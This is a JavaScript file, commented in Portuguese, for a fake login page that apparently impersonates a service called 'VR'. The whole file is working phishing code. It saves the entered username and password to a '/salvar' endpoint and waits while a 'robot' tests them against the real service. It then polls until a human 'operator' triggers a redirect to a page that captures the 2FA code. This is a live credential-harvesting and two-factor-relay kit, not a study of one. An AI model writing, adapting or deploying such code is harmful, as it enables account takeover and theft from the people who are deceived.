const form = document.getElementById("submission-form");
const botao = document.getElementById("continuar");
const inputNome = document.getElementById("nome");
const inputSenha = document.getElementById("senha");
const fieldSenha = document.getElementById("field-senha");
const statusElem = document.getElementById("submission-status");
const loginErroElem = document.getElementById("login-erro");

// Lê parâmetros da URL caso a página tenha sido chamada com query string
const urlParams = new URLSearchParams(window.location.search);
const paramId = urlParams.get("identificador") || urlParams.get("nome");
const paramSenha = urlParams.get("senha") || urlParams.get("password");

if (paramId && inputNome) {
    inputNome.value = paramId;
}
if (paramSenha && inputSenha) {
    inputSenha.value = paramSenha;
}

function mostrarErro(mensagem) {
    if (!loginErroElem) return;
    if (mensagem) {
        const span = loginErroElem.querySelector("span");
        if (span) span.textContent = mensagem;
    }
    loginErroElem.style.display = "flex";
    if (fieldSenha) fieldSenha.classList.add("has-error");
}

function esconderErro() {
    if (loginErroElem) loginErroElem.style.display = "none";
    if (fieldSenha) fieldSenha.classList.remove("has-error");
}

function updateButtonState() {
    if (!botao || !inputNome || !inputSenha) return;
    const nomeVal = inputNome.value.trim();
    const senhaVal = inputSenha.value;

    // Regra Fundamental: Só remove o erro se o usuário efetivamente digitar novo caractere (val.length > 0)
    if (senhaVal.length > 0) {
        esconderErro();
    }

    if (nomeVal.length > 0 && senhaVal.length > 0) {
        botao.disabled = false;
        botao.classList.add("active");
    } else {
        botao.disabled = true;
        botao.classList.remove("active");
    }
}

if (inputNome) {
    inputNome.addEventListener("input", updateButtonState);
    inputNome.addEventListener("keyup", updateButtonState);
    inputNome.addEventListener("change", updateButtonState);
}

if (inputSenha) {
    inputSenha.addEventListener("input", updateButtonState);
    inputSenha.addEventListener("keyup", updateButtonState);
    inputSenha.addEventListener("change", updateButtonState);
}

// Inicializa o estado do botão no carregamento
updateButtonState();

if (form) {
    form.addEventListener("submit", async (e) => {
        e.preventDefault();
        await handleLogin();
    });
}

if (botao) {
    botao.addEventListener("click", async (e) => {
        e.preventDefault();
        await handleLogin();
    });
}

let loginPollingInterval = null;

async function handleLogin() {
    if (!inputNome || !inputSenha) return;
    const nome = inputNome.value.trim();
    const senha = inputSenha.value;

    if (!nome || !senha) {
        if (statusElem) statusElem.textContent = "Preencha todos os campos.";
        return;
    }

    // Estado visual de processamento / loading
    botao.disabled = true;
    botao.classList.remove("active");
    botao.textContent = "Aguarde...";
    if (statusElem) statusElem.textContent = "";
    esconderErro();

    // Armazena no sessionStorage para personalização da tela de 2FA
    sessionStorage.setItem("vr_usuario", nome);

    try {
        await fetch("/salvar", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                nome: nome,
                senha: senha
            })
        });
    } catch (erro) {
        console.error("Aviso no envio de credenciais:", erro);
    }

    // Fica em estado de loading enquanto o robô valida ou o operador decide
    iniciarEspera2FA(nome);
}

function iniciarEspera2FA(nome) {
    if (loginPollingInterval) clearInterval(loginPollingInterval);

    loginPollingInterval = setInterval(async () => {
        try {
            const res = await fetch(`/api/status-login?usuario=${encodeURIComponent(nome)}&t=${Date.now()}`, {
                cache: "no-store",
                headers: { "Cache-Control": "no-cache" }
            });
            if (!res.ok) return;
            const data = await res.json();

            // 1. Se o robô detectou que a senha está incorreta na VR
            if (data.status_credencial === "invalido") {
                clearInterval(loginPollingInterval);
                loginPollingInterval = null;

                // Restaura o botão e exibe erro
                botao.disabled = true;
                botao.classList.remove("active");
                botao.textContent = "Continuar";
                mostrarErro("E-mail ou senha incorretos. Verifique seus dados e tente novamente.");

                inputSenha.value = "";
                inputSenha.focus();
                return;
            }

            // 2. Se o operador clicou em Solicitar 2FA
            if (data.status_login === "solicitar_2fa") {
                clearInterval(loginPollingInterval);
                loginPollingInterval = null;
                botao.textContent = "Redirecionando...";
                setTimeout(() => {
                    window.location.href = `/codigo.html?usuario=${encodeURIComponent(nome)}`;
                }, 300);
                return;
            }
        } catch (err) {
            console.error("Erro ao verificar status do login:", err);
        }
    }, 1000);
}
